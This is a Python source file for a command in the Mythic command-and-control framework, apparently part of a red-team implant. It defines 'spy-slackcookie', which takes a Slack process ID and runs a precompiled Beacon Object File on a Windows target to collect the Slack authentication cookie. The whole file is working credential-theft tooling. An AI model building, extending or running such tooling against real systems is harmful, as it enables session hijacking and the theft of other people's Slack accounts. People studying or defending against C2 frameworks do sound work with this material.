
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import logging

from .Utils.u import *

class SpyslackcookieArguments( TaskArguments ):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pid",
                cli_name="pid",
                display_name="pid",
                type=ParameterType.String,
                description="Process ID of slack process",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                # JSON input
                try:
                    json_data = json.loads(self.command_line)
                    self.add_arg("pid", json_data["pid"])
                except:
                    raise Exception("Failed to parse JSON arguments")
            else:
                # Command line input (e.g., "pid=1234")
                try:
                    for arg in self.command_line.split():
                        if "=" in arg:
                            key, value = arg.split("=", 1)
                            if key.lower() == "pid":
                                self.add_arg("pid", value)
                except:
                    raise Exception("Failed to parse command line arguments")
        
        # Verify required arguments
        if not self.get_arg("pid"):
            raise Exception("Missing required argument: pid")

class SpyslackcookieCommand( CommandBase ):
    cmd         = "spy-slackcookie"
    needs_admin = False
    help_cmd    = "spy-slackcookie"
    description = \
    """
    Collect the Slack authentication cookie from a Slack process

    Category: Beacon Object File
    """
    version = 1
    author = "@Oblivion"
    argument_class = SpyslackcookieArguments
    browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
    
        content:bytes = await get_content_by_name( "kh_slack_cookie.x64.o", task.Task.ID )

        process_id = task.args.get_arg("pid") 
        display_params = ""

        if process_id :
            display_params += f" -pid {process_id}"

        bof_args = [
            {"type": "int32", "value": int(process_id)},
        ]

        task.args.remove_arg("pid")
        
        task.args.add_arg("bof_file", content.hex())
        task.args.add_arg("bof_id", 0, ParameterType.Number)
        task.args.add_arg("bof_args", json.dumps(bof_args))

        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            CommandName="exec-bof",
            TokenID=task.Task.TokenID,
            DisplayParams=display_params
        )
  
    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
